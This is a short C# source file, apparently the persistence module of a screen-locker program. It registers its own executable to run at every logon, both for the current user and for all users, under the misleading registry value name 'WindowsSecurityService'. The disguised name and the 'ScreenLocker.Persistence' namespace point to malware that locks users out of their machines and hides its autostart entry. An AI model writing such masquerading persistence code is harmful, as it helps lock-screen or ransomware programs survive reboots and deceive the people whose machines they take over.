namespace ScreenLocker.Persistence;

using Microsoft.Win32;

public static class StartupRegistration
{
    private const string RunKeyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    private const string ValueName = "WindowsSecurityService";

    public static bool Register()
    {
        string? exePath = Environment.ProcessPath;
        if (string.IsNullOrEmpty(exePath))
            return false;

        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(RunKeyPath, true);
            key?.SetValue(ValueName, $"\"{exePath}\"");
            return true;
        }
        catch
        {
            return false;
        }
    }

    public static bool Unregister()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(RunKeyPath, true);
            key?.DeleteValue(ValueName, false);
            return true;
        }
        catch
        {
            return false;
        }
    }

    public static bool IsRegistered()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(RunKeyPath);
            return key?.GetValue(ValueName) is not null;
        }
        catch
        {
            return false;
        }
    }

    public static bool RegisterForAllUsers()
    {
        string? exePath = Environment.ProcessPath;
        if (string.IsNullOrEmpty(exePath))
            return false;

        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(RunKeyPath, true);
            key?.SetValue(ValueName, $"\"{exePath}\"");
            return true;
        }
        catch
        {
            return false;
        }
    }
}
